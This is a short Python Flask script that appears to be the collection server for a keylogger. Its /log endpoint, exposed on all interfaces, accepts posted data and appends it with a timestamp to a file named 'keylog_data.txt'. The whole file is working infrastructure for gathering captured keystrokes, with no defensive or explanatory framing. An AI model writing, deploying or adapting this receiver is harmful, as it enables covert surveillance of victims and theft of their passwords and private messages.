from flask import Flask, request
from datetime import datetime
import os

app = Flask(__name__)
LOG_FILE = "keylog_data.txt"

@app.route("/log", methods=["POST"])
def log_data():
    data = request.get_data(as_text=True)
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {data}\n"

    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(log_entry)

    return "Logged", 200

if __name__ == "__main__":
    os.makedirs("logs", exist_ok=True)
    os.chdir("logs")
    app.run(host="0.0.0.0", port=5000)
